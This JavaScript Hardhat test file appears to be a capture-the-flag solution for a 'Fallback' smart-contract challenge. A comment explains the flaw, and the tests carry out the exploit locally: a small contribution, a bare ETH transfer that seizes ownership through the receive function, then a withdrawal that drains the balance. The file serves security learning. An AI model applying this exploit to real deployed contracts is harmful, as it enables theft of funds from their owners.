const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

███████╗░█████╗░██╗░░░░░██╗░░░░░██████╗░░█████╗░░█████╗░██╗░░██╗
██╔════╝██╔══██╗██║░░░░░██║░░░░░██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
█████╗░░███████║██║░░░░░██║░░░░░██████╦╝███████║██║░░╚═╝█████═╝░
██╔══╝░░██╔══██║██║░░░░░██║░░░░░██╔══██╗██╔══██║██║░░██╗██╔═██╗░
██║░░░░░██║░░██║███████╗███████╗██████╦╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

 * Goal: 
 * 
 * 1. Claim ownership of the contract
 * 2. Reduce its balance to 0
 *
 * Solution:
 * 
 * To steal Contract Ownership just look at the "receive" 
 * function that checks msg.value and contributions. 
 * Once you have sent the contribution with the "contribute" function, 
 * you only need to deposit funds to the contract (msg.value > 0). 
 * Since there is no function to send funds to contracts, the fallback 
 * function in this case called "receive" comes into play. 
 * Passing control over contributions, thanks to the "contribute" function 
 * allows us to change the "owner" parameter by taking ownership of the contract.
 * 
 * Note:
 * 
 * fallback doc (https://docs.soliditylang.org/en/v0.8.15/contracts.html?highlight=fallback#fallback-function)
 * 
 */
describe("Fallback", function () {
    let fallback;
    let owner, player;

    before(async function () {
        // Contracts are deployed using the first signer/account by default
        [owner, player] = await ethers.getSigners();

        const Fallback = await ethers.getContractFactory("contracts/Fallback/Fallback.sol:Fallback");
        fallback = await Fallback.deploy();
    });

    describe("Check ownership", function () {
        it("Should have the deployer as owner", async function () {
            expect(await fallback.owner()).to.be.eq(owner.address);
        });
    });

    describe("Check contributions", function () {
        it("Should have the player zero contributions", async function () {
            expect(await fallback.connect(player).getContribution()).to.be.eq("0");
        });

        it("Should have the owner contributions", async function () {
            expect(await fallback.connect(owner).getContribution()).to.be.eq("1000000000000000000000"); // 1000 ETH as per contract
        });
    });

    describe("Contribute", function () {
        it("Should have the player contributions", async function () {
            await fallback.connect(player).contribute({ value: ethers.utils.parseEther("0.0001") }); // must be less than 0.001 as per contract

            expect(await fallback.connect(player).getContribution()).to.be.eq(ethers.utils.parseEther("0.0001"));
        });
    });

    describe("Deposit ETH (use fallback)", function () {
        it("Should permit the player to steal the ownership", async function () {
            // use fallback exploit. the value must be greater than zero.
            await player.sendTransaction({ from: player.address, to: fallback.address, value: ethers.utils.parseEther("0.000001") });

            expect(await fallback.owner()).to.be.eq(player.address); // now player is the new owner
        });
    });

    describe("Drain the contract", function () {
        it("Should withdraw all funds", async function () {
            expect(await ethers.provider.getBalance(fallback.address)).to.be.greaterThan(0);

            await fallback.connect(player).withdraw(); // withdraws all funds

            expect(await ethers.provider.getBalance(fallback.address)).to.be.eq(0);
        });
    });
});
